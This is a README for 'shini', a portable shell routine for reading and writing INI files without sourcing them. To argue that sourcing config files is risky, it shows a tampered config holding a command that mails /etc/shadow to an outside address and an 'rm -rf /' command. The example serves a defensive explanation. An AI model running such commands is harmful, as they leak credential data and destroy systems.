shini
=====

A small, minimialist, portable `/bin/sh` routine for reading and writing INI files.

## About

### What is `shini`?
As above.

### Why do I need it?
You probably don't.  But if you have or ever do find yourself writing a shell script which:
 * Needs system or user specific settings
 * Needs to read an existing INI file
... then you might find `shini` saves you a lot of time, and makes things safer.

### How can it make things safer?
Because system and user specific settings in shell scripts usually end up implemented as:

```
# /usr/local/sbin/rootonlyscript
. /etc/myscript
if [ -n SETTING1 ]; then
  echo "You didn't specify SETTING1" 1>&2
fi
```

The settings file looks like:

```
# /etc/myscript
SETTING1='abc'
SETTING2='def'

```
... and cool *until* this happens:

```
# /etc/myscript
SETTING1='abc'
SETTING2='def'
cat /etc/shadow | mail someone@wishyouwerehere.com
rm -rf /
```

Alas, bye bye shadow file - bye bye system.

`shini` only reads the file; never includes, interprets or executes it.  A better solution.

### So `shini` just makes my shell script secure?

Erm, no.  Please go away and learn to code before proceeding.

Remember:
 * Your config file must always have sane file permissions - even if its an INI file
 * `shini` is to be included in your script - so it should be located somewhere safe, and with read-only permissions

Best advice, if in doubt:

```
sudo chown root:root shini.sh
sudo chmod 644 shini.sh
```


